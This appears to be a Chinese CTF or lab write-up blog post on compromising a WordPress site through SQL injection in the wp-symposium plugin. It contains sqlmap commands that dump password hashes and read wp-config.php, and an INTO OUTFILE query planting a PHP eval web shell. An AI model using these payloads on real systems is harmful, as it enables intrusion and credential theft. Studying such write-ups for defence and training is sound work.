@@ -1,0 +1,885 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Web,渗透测试," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="https://github.com/Windylh/image/raw/master/icon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="0x00 信息收集网址是一个wordpress博客。1Apache/2.4.10 (Debian)
+既然是wp，直接用wpscan扫一扫。123456789101112131415161718[+] We found 2 plugins:[+] Name: akismet |  Latest version: 3.3.4 |  Location: http://218.2.197.234:2040">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Wordpress插件渗透测试">
+<meta property="og:url" content="http://yoursite.com/2018/11/01/Wordpress插件渗透测试/index.html">
+<meta property="og:site_name" content="Windylh's blog">
+<meta property="og:description" content="0x00 信息收集网址是一个wordpress博客。1Apache/2.4.10 (Debian)
+既然是wp，直接用wpscan扫一扫。123456789101112131415161718[+] We found 2 plugins:[+] Name: akismet |  Latest version: 3.3.4 |  Location: http://218.2.197.234:2040">
+<meta property="og:updated_time" content="2018-11-01T00:55:31.078Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Wordpress插件渗透测试">
+<meta name="twitter:description" content="0x00 信息收集网址是一个wordpress博客。1Apache/2.4.10 (Debian)
+既然是wp，直接用wpscan扫一扫。123456789101112131415161718[+] We found 2 plugins:[+] Name: akismet |  Latest version: 3.3.4 |  Location: http://218.2.197.234:2040">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/01/Wordpress插件渗透测试/"/>
+
+
+
+
+
+  <title> Wordpress插件渗透测试 | Windylh's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Windylh's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/01/Wordpress插件渗透测试/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Wordpress插件渗透测试
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-01T16:11:12+08:00">
+                2018-11-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/01/Wordpress插件渗透测试/" class="leancloud_visitors" data-flag-title="Wordpress插件渗透测试">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h2><p>网址是一个wordpress博客。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Apache/2.4.10 (Debian)</div></pre></td></tr></table></figure></p>
+<p>既然是wp，直接用wpscan扫一扫。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[+] We found 2 plugins:</div><div class="line"></div><div class="line">[+] Name: akismet</div><div class="line"> |  Latest version: 3.3.4</div><div class="line"> |  Location: http://218.2.197.234:2040/wp-content/plugins/akismet/</div><div class="line"></div><div class="line">[!] We could not determine a version so all vulnerabilities are printed out</div><div class="line"></div><div class="line">[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)</div><div class="line">    Reference: https://wpvulndb.com/vulnerabilities/8215</div><div class="line">    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/</div><div class="line">    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html</div><div class="line">[i] Fixed in: 3.1.5</div><div class="line"></div><div class="line">[+] Name: wp-symposium - v15.1</div><div class="line"> |  Location: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/</div><div class="line"> |  Readme: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/readme.txt</div><div class="line">[!] The version is out of date, the latest version is 15.8.1</div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>找到了两个“过气”插件，存在漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[!] Title: WP Symposium &lt;= 15.1 - SQL Injection</div><div class="line">    Reference: https://wpvulndb.com/vulnerabilities/7902</div><div class="line">    Reference: http://permalink.gmane.org/gmane.comp.security.oss.general/16479</div><div class="line">    Reference: http://packetstormsecurity.com/files/131801/</div><div class="line">    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3325</div><div class="line">    Reference: https://www.exploit-db.com/exploits/37080/</div><div class="line">[i] Fixed in: 15.4</div><div class="line"></div><div class="line">[!] Title: WP Symposium &lt;=  15.5.1 - Unauthenticated SQL Injection</div><div class="line">    Reference: https://wpvulndb.com/vulnerabilities/8140</div><div class="line">    Reference: https://plugins.trac.wordpress.org/changeset/1214872/wp-symposium</div><div class="line">    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6522</div><div class="line">    Reference: https://www.exploit-db.com/exploits/37824/</div><div class="line">[i] Fixed in: 15.8</div><div class="line"></div><div class="line">[!] Title: WP Symposium &lt;= 15.1 - Blind SQL Injection</div><div class="line">    Reference: https://wpvulndb.com/vulnerabilities/8148</div><div class="line">    Reference: https://security.dxw.com/advisories/blind-sql-injection-in-wp-symposium-allows-unauthenticated-attackers-to-access-sensitive-data/</div><div class="line">[i] Fixed in: 15.8</div></pre></td></tr></table></figure></p>
+<h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>CVE-2015-3325的sql注入是利用wp-symposium插件中的get_album_item.php。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">include_once</span>(<span class="string">'../../../wp-config.php'</span>);</div><div class="line">    <span class="keyword">global</span> $wpdb;</div><div class="line">    $iid = $_REQUEST[<span class="string">'iid'</span>];</div><div class="line">    $size = $_REQUEST[<span class="string">'size'</span>];</div><div class="line">    $sql = <span class="string">"SELECT "</span>.$size.<span class="string">" FROM "</span>.$wpdb-&gt;base_prefix.<span class="string">"symposium_gallery_items WHERE iid = %d"</span>;</div><div class="line">    $image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid));    </div><div class="line">    header(<span class="string">"Content-type: image/jpeg"</span>);</div><div class="line">    <span class="keyword">echo</span> stripslashes($image);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>构造size参数，来进行sql查询，代码也没有过滤，但是在查询列名限制table_name的时候却没有返回，如果不限制table_name，会因为文件大小限制只显示1kb的内容，看不到wp_users的列名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?size=group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=%27users%27%20;%20--</div></pre></td></tr></table></figure></p>
+<p>无奈，放弃这个漏洞，看那个盲注的CVE。</p>
+<p><a href="https://www.exploit-db.com/exploits/37822/" target="_blank" rel="external">https://www.exploit-db.com/exploits/37822/</a></p>
+<p>topic_id参数存在盲注，访问对应页面，将post请求保存到文件中，用sqlmap来测试。(测试的时候没有删掉exp中的sleep函数，导致脚本多跑了好久。。。)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; --dbs --level 3</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">available databases [4]:</div><div class="line">[*] information_schema</div><div class="line">[*] mysql</div><div class="line">[*] performance_schema</div><div class="line">[*] wordpress</div></pre></td></tr></table></figure>
+<p>表名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; -D &quot;wordpress&quot; --tables</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">Database: wordpress</div><div class="line">[36 tables]</div><div class="line">+------------------------------+</div><div class="line">| wp_commentmeta               |</div><div class="line">| wp_comments                  |</div><div class="line">| wp_links                     |</div><div class="line">| wp_options                   |</div><div class="line">| wp_postmeta                  |</div><div class="line">| wp_posts                     |</div><div class="line">| wp_symposium_audit           |</div><div class="line">| wp_symposium_cats            |</div><div class="line">| wp_symposium_chat2           |</div><div class="line">| wp_symposium_chat2_typing    |</div><div class="line">| wp_symposium_chat2_users     |</div><div class="line">| wp_symposium_comments        |</div><div class="line">| wp_symposium_events          |</div><div class="line">| wp_symposium_events_bookings |</div><div class="line">| wp_symposium_extended        |</div><div class="line">| wp_symposium_following       |</div><div class="line">| wp_symposium_friends         |</div><div class="line">| wp_symposium_gallery         |</div><div class="line">| wp_symposium_gallery_items   |</div><div class="line">| wp_symposium_group_members   |</div><div class="line">| wp_symposium_groups          |</div><div class="line">| wp_symposium_likes           |</div><div class="line">| wp_symposium_lounge          |</div><div class="line">| wp_symposium_mail            |</div><div class="line">| wp_symposium_news            |</div><div class="line">| wp_symposium_styles          |</div><div class="line">| wp_symposium_subs            |</div><div class="line">| wp_symposium_topics          |</div><div class="line">| wp_symposium_topics_images   |</div><div class="line">| wp_symposium_topics_scores   |</div><div class="line">| wp_symposium_usermeta        |</div><div class="line">| wp_term_relationships        |</div><div class="line">| wp_term_taxonomy             |</div><div class="line">| wp_terms                     |</div><div class="line">| wp_usermeta                  |</div><div class="line">| wp_users                     |</div><div class="line">+------------------------------+</div></pre></td></tr></table></figure>
+<p>列名<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; --columns</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Database: wordpress</div><div class="line">Table: wp_users</div><div class="line">[10 columns]</div><div class="line">+---------------------+---------------------+</div><div class="line">| Column              | Type                |</div><div class="line">+---------------------+---------------------+</div><div class="line">| display_name        | varchar(250)        |</div><div class="line">| ID                  | bigint(20) unsigned |</div><div class="line">| user_activation_key | varchar(60)         |</div><div class="line">| user_email          | varchar(100)        |</div><div class="line">| user_login          | varchar(60)         |</div><div class="line">| user_nicename       | varchar(50)         |</div><div class="line">| user_pass           | varchar(64)         |</div><div class="line">| user_registered     | datetime            |</div><div class="line">| user_status         | int(11)             |</div><div class="line">| user_url            | varchar(100)        |</div><div class="line">+---------------------+---------------------+</div></pre></td></tr></table></figure>
+<p>查询内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; -C &quot;user_pass&quot; --dump</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">+------------------------------------+</div><div class="line">| user_pass                          |</div><div class="line">+------------------------------------+</div><div class="line">| $P$BoRvgt/kaEDWqyiq0a3U8QjUQAO6gQ0 |</div><div class="line">+------------------------------------+</div></pre></td></tr></table></figure>
+<p>用CVE-2015-3325按照对应的表名列名也是能查到管理员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?size=group_concat(user_nicename,0x7e,user_pass) FROM wp_users%20;%20--</div></pre></td></tr></table></figure></p>
+<p>但是数据库中的管理员密码是强加密的，没办法解密。</p>
+<p>之前扫到服务器还有一个phpmyadmin网页，可以从这里入手。</p>
+<p>用sqlmap扫描phpmyadmin的密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; --current-user --password</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">database management system users password hashes:</div><div class="line">[*] debian-sys-maint [1]:</div><div class="line">    password hash: *AA59232D46C9C0751BA3069045A0B90F3C6431C4</div><div class="line">[*] root [1]:</div><div class="line">    password hash: *74ACCF7FB15CDBAEE88B9E7F7B58352D3308CFF2</div><div class="line">[*] wordpress [1]:</div><div class="line">    password hash: *A22BD9F95BF505E792C556FC1EF9FCFA6B6B5D9B</div></pre></td></tr></table></figure>
+<p>也是没有办法解密。。。</p>
+<p>经过表哥提示，直接利用sqlmap读取wp的配置文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r &quot;E:\1.txt&quot; --file-read &quot;/var/www/html/wp-config.php&quot; -p &quot;topic_id&quot;</div></pre></td></tr></table></figure>
+<p>成功读取到phpmyadmin的账户密码。</p>
+<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>登陆到phpmyadmin，通过sql查询语句写入shell。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[adadminn])?&gt;'</span><span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/var/www/html/nibuhuicaidao.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>报错：<code>Can&#39;t create/write to file &#39;/var/www/html/nibuhuicaidao.php&#39; (Errcode: 13)</code></p>
+<p>提示目录不可写。</p>
+<p>用dirbuster工具爆破了一下目录，发现还有一个image的目录，测试，发现可写。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="string">'&lt;?php @eval($_POST[adadminn])?&gt;'</span><span class="keyword">INTO</span> <span class="keyword">OUTFILE</span> <span class="string">'/var/www/html/images/nibuhuicaidao.php'</span>;</div></pre></td></tr></table></figure>
+<p>菜刀链接，拿到flag<code>flag{Hi_Web_fLaG_Is_HEre}</code>。</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/01/SUCTF2018部分Writeup/" rel="next" title="SUCTF2018部分Writeup">
+                <i class="fa fa-chevron-left"></i> SUCTF2018部分Writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/01/XNUCA-Writeup/" rel="prev" title="XNUCA-Writeup">
+                XNUCA-Writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg"
+               alt="Windylh" />
+          <p class="site-author-name" itemprop="name">Windylh</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">25</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Windylh" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/WindylhPeng" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/1553700980" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.izilong.net/" title="Zilong" target="_blank">Zilong</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://iwenhu.cn/" title="Mengchen" target="_blank">Mengchen</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://keysking.github.io/" title="Keysking" target="_blank">Keysking</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lanvnal.com/" title="LANVNAL" target="_blank">LANVNAL</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wsimp1er.com/" title="Simp1er" target="_blank">Simp1er</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-信息收集"><span class="nav-number">1.</span> <span class="nav-text">0x00 信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">0x01 漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Getshell"><span class="nav-number">2.1.</span> <span class="nav-text">Getshell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017.3 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Windylh</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("G38Wjo4XURoegldByMbpMI2C-gzGzoHsz", "PAvMrVY87vPwX9PBcMLfYmw4");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
